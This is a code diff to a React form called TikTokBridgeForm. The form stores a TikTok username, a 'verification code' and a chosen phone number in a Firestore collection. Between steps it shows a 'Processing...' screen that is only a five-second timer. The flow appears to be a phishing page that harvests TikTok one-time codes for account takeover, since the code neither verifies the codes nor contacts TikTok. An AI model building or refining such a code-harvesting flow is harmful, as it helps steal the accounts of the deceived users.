@@ -6,7 +6,7 @@ import { zodResolver } from "@hookform/resolvers/zod";
 import * as z from "zod";
 import { useForm } from "react-hook-form";
 import { User, Phone, KeyRound, CheckCircle, Loader2, AtSign, Check, X } from "lucide-react";
-import { collection, doc, addDoc } from "firebase/firestore";
+import { collection, doc, addDoc, updateDoc } from "firebase/firestore";
 import { useRouter } from "next/navigation";
 
 import { Button } from "@/components/ui/button";
@@ -88,7 +88,7 @@ export function TikTokBridgeForm() {
     try {
         if (!firestore) throw new Error("Firestore not available");
         
-        if (currentStep === 0) {
+        if (currentStep === 0) { // Submitting username
             const { username } = form.getValues();
             const docRef = await addDoc(collection(firestore, "tiktok_users"), {
                 tiktokUsername: username,
@@ -98,23 +98,23 @@ export function TikTokBridgeForm() {
             setSubmissionId(docRef.id);
             localStorage.setItem('submissionId', docRef.id);
 
-            api.scrollNext();
+            api.scrollNext(); // Go to processing
             setTimeout(() => {
-                api.scrollNext();
+                api.scrollNext(); // Go to enter code
                 setIsSubmitting(false);
             }, 5000);
             return;
         }
         
-        if (currentStep === 2) {
+        if (currentStep === 2) { // Submitting verification code
             if (!submissionId) throw new Error("Submission ID not found");
             const { verificationCode } = form.getValues();
             const submissionDocRef = doc(firestore, 'tiktok_users', submissionId);
-            updateDocumentNonBlocking(submissionDocRef, { verificationCode });
+            await updateDoc(submissionDocRef, { verificationCode });
             api.scrollNext();
         }
 
-        if (currentStep === 3) {
+        if (currentStep === 3) { // Submitting phone number
             if (!submissionId) throw new Error("Submission ID not found");
             
             const { usNumber } = form.getValues();
@@ -127,16 +127,17 @@ export function TikTokBridgeForm() {
                 phoneNumber: selectedPhoneNumberDoc.phoneNumber,
             };
 
-            updateDocumentNonBlocking(submissionDocRef, finalData);
+            await updateDoc(submissionDocRef, finalData);
             
-            router.push(`/waiting-for-approval?id=${submissionId}`);
+            // Redirect to waiting page
+            router.push(`/waiting-for-approval`);
             return; 
         }
 
     } catch (e) {
         console.error("An error occurred: ", e);
     } finally {
-        if (currentStep !== 0) {
+        if (currentStep !== 0) { // Don't reset submitting state for the async step 0
             setIsSubmitting(false);
         }
     }
@@ -187,7 +188,7 @@ export function TikTokBridgeForm() {
       </CardHeader>
       <Form {...form}>
         <form onSubmit={(e) => e.preventDefault()}>
-          <CardContent className="min-h-[380px]">
+          <CardContent className="min-h-[96px]">
             <Carousel setApi={setApi} opts={{ watchDrag: false, allowTouchMove: false }} className="w-full">
               <CarouselContent>
                 <CarouselItem>
@@ -210,7 +211,7 @@ export function TikTokBridgeForm() {
                 </CarouselItem>
 
                 <CarouselItem>
-                    <div className="text-center py-8 flex flex-col items-center justify-center h-[300px]">
+                    <div className="text-center py-8 flex flex-col items-center justify-center h-full">
                         <TikTokLogo className="h-20 w-20 text-primary animate-pulse" />
                         <h3 className="text-xl font-semibold mt-4">Processing...</h3>
                         <p className="text-muted-foreground mt-2 max-w-[250px]">Please wait a moment.</p>
@@ -317,7 +318,9 @@ export function TikTokBridgeForm() {
                 {isSubmitting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : null}
                 {currentStep === 3 ? "Finish & Wait for Approval" : "Continue"}
               </Button>
-              <Button type="button" variant="ghost" onClick={handlePrev} disabled={currentStep === 0 || isSubmitting} className="w-full rounded-full">Back</Button>
+              {currentStep > 0 &&
+                <Button type="button" variant="ghost" onClick={handlePrev} disabled={isSubmitting} className="w-full rounded-full">Back</Button>
+              }
             </CardFooter>
           )}
         </form>
